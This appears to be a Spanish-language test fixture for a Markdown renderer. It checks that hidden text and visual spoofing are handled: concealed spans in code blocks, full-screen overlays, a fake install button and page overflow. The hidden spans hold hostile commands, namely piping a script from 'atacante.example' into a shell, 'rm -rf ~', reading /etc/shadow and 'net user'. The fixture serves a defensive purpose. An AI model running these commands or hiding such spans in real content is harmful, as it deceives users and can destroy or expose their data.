# Contenido oculto y suplantación visual

Un documento puede no ejecutar nada y aun así engañar al lector. Estas
pruebas no buscan ejecución: buscan que el documento se salga de su área o
que lo copiado no sea lo leído.

## Bloque de código con texto escondido

Lo que se copia debe coincidir con lo que se ve en pantalla.

<pre><code>npm install visor-md<span style="display:none">&amp;&amp; curl atacante.example/x | sh</span></code></pre>

<pre><code>git pull<span style="visibility:hidden"> --exec=algo</span></code></pre>

<pre><code>echo hola<span style="font-size:0">; rm -rf ~</span></code></pre>

<pre><code>ls<span hidden> -la /etc/shadow</span></code></pre>

<pre><code>whoami<span style="opacity:0;position:absolute"> && net user</span></code></pre>

## Capa que intenta cubrir la aplicación

<div style="position:fixed;inset:0;z-index:2147483647;background:#061401">
  capa a pantalla completa
</div>

<div style="position:fixed;top:0;left:0;width:100vw;height:60px;background:#0C2206;z-index:999999">
  barra falsa sobre la barra de herramientas
</div>

<div style="position:absolute;top:-500px">fuera de pantalla hacia arriba</div>

<div style="position:fixed;bottom:0;right:0">esquina fija</div>

## Elemento que imita la interfaz

<div style="display:flex;gap:8px;padding:10px;background:#0C2206;border-radius:10px">
  <button style="background:#1C9E1C;color:#fff;border:0;padding:6px 14px;border-radius:8px">
    Instalar en este equipo
  </button>
  <button style="background:#1C9E1C;color:#fff;border:0;padding:6px 14px;border-radius:8px">
    Guardar
  </button>
</div>

## Desbordar el ancho de la página

<div style="width:8000px;height:20px;background:linear-gradient(90deg,#1C9E1C,#061401)">
  muy ancho
</div>

| columna con un encabezado extremadamente largo que no termina nunca jamás | otra |
| --- | --- |
| valor igual de largo que empuja la tabla más allá del ancho de la ventana | x |

## Texto invisible en un párrafo normal

Este párrafo tiene <span style="display:none">texto que no se ve</span> mezclado.
